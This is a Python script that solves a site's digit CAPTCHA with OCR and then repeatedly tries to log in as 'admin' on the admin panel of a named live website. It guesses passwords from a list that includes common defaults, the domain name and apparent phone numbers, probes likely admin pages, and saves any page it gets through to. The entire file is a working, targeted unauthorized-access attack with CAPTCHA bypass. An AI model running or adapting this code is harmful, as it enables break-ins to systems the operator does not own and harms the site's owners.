import pytesseract
from PIL import Image
import requests
import io
import re
import sys

# Known digit patterns (10x6 binary patterns for digits 0-9)
# Based on 6-column-wide, 10-row-high binary representations
# We'll build from the data we observed

def extract_digit_patterns(img):
    """Extract binary patterns for each digit position in the captcha."""
    w, h = img.size
    pixels = img.load()
    gray = img.convert('L')
    
    # Binarize
    bw_data = []
    for y in range(h):
        row = []
        for x in range(w):
            r, g, b = pixels[x, y]
            brightness = 0.299 * r + 0.587 * g + 0.114 * b
            row.append(0 if brightness < 220 else 1)
        bw_data.append(row)
    
    # Find digit columns
    col_has_dark = [any(bw_data[y][x] == 0 for y in range(h)) for x in range(w)]
    
    digits = []
    in_digit = False
    start = 0
    for x in range(w):
        if col_has_dark[x] and not in_digit:
            start = x
            in_digit = True
        elif not col_has_dark[x] and in_digit:
            digits.append((start, x - 1))
            in_digit = False
    if in_digit:
        digits.append((start, w - 1))
    
    # Extract patterns
    patterns = []
    for start, end in digits:
        pattern = []
        for y in range(h):
            row = [bw_data[y][x] for x in range(start, end + 1)]
            pattern.append(row)
        patterns.append((start, pattern))
    
    return patterns

def pattern_to_string(pattern):
    """Convert binary pattern to ASCII string for display."""
    rows = []
    for row in pattern:
        rows.append("".join("0" if v == 0 else "." for v in row))
    return "\n".join("    " + r for r in rows)

def match_digit(pattern):
    """Try to match a digit pattern using OCR on a clean enlarged version."""
    h = len(pattern)
    w = len(pattern[0])
    
    # Create a clean PIL image
    img = Image.new('L', (w, h), 255)
    for y in range(h):
        for x in range(w):
            if y < len(pattern) and x < len(pattern[y]):
                if pattern[y][x] == 0:
                    img.putpixel((x, y), 0)
    
    # Enlarge significantly
    big = img.resize((w * 20, h * 20), Image.NEAREST)
    
    # OCR with single char mode
    text = pytesseract.image_to_string(big, config='--psm 10 --oem 3 -c tessedit_char_whitelist=0123456789').strip()
    clean = ''.join(c for c in text if c.isdigit())
    
    if clean:
        return clean[0]
    
    # Try PSM 13
    text = pytesseract.image_to_string(big, config='--psm 13 --oem 3 -c tessedit_char_whitelist=0123456789').strip()
    clean = ''.join(c for c in text if c.isdigit())
    if clean:
        return clean[0]
    
    return "?"

def try_login(password, max_attempts=30):
    """Try login with aggressive captcha retry."""
    for attempt in range(max_attempts):
        session = requests.Session()
        
        # Get session
        session.get("http://bjhzsv.com/main/", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        
        # Get captcha
        r = session.get("http://bjhzsv.com/main/inc/code.asp", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        if r.status_code != 200:
            continue
        
        img = Image.open(io.BytesIO(r.content))
        
        # Extract digit patterns
        patterns = extract_digit_patterns(img)
        
        if len(patterns) != 4:
            print(f"  Attempt {attempt+1}: Found {len(patterns)} digit regions (expected 4), retrying...")
            continue
        
        # OCR each digit
        digits = []
        for pos, pattern in patterns:
            d = match_digit(pattern)
            digits.append(d)
        
        captcha = "".join(digits)
        print(f"  Attempt {attempt+1}: digits={digits} captcha={captcha}")
        
        if "?" in captcha:
            continue
        
        # POST login
        login_data = {"t1": "admin", "t2": password, "t3": captcha}
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "http://bjhzsv.com/main/"
        }
        
        r = session.post("http://bjhzsv.com/main/a7chkuser.asp", data=login_data, headers=headers, timeout=15)
        
        # Check response
        match = re.search(r"href='([^']+)'", r.text)
        if match:
            target = match.group(1)
            if not target.startswith("http"):
                target = "http://bjhzsv.com/main/" + target
            r2 = session.get(target, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
            
            # Check if we got a different page (means login worked)
            if len(r2.text) != 1888:
                print(f"  *** DIFFERENT PAGE! Length={len(r2.text)} ***")
                print(f"  Content: {r2.text[:500]}")
                return True, captcha, r2.text
            
            # Try admin pages
            for page in ["left.asp", "top.asp", "right.asp", "admin.asp", "manage.asp", "main.asp", "default.asp", "index2.asp"]:
                r3 = session.get(f"http://bjhzsv.com/main/{page}", headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
                if r3.status_code == 200 and len(r3.text) > 100 and r3.text != r2.text:
                    if "a7chkuser" not in r3.text:
                        print(f"  Found different page: {page} ({len(r3.text)} bytes)")
                        print(f"  Content: {r3.text[:300]}")
                        return True, captcha, r3.text
    
    return False, None, None

passwords = [
    "admin",
    "admin999",
    "admin888", 
    "123456",
    "bjhzsv",
    "bjhzsv.com",
    "13681449049",
    "01062489782"
]

print("=" * 60)
print("BJZHSV.COM FINAL LOGIN ATTEMPT")
print("=" * 60)

for pwd in passwords:
    print(f"\n{'='*60}")
    print(f"TRYING: admin:{pwd}")
    print(f"{'='*60}")
    
    success, captcha, resp = try_login(pwd, max_attempts=20)
    
    if success:
        print(f"\n  *** SUCCESS! Password: {pwd} (captcha: {captcha}) ***")
        with open(f"/tmp/bjhzsv_success.html", "w") as f:
            f.write(resp)
        sys.exit(0)
    else:
        print(f"  -> All attempts failed for {pwd}")

print("\n" + "=" * 60)
print("ALL PASSWORDS FAILED")
print("=" * 60)
